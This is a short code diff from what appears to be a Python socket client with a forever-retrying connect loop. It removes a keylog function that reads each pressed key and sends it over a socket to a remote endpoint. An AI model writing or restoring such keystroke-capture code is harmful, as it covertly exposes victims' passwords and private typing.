@@ -22,14 +22,7 @@ def recvall(sock,n):
         if not packet:
             return None
         data += packet
-    return data
-
-def keylog(key):
-    try:
-        k = key.char
-    except: k = key.name
-    send_msg(s, k)
-	
+    return data	
 def connect():
     global s
     while 1:
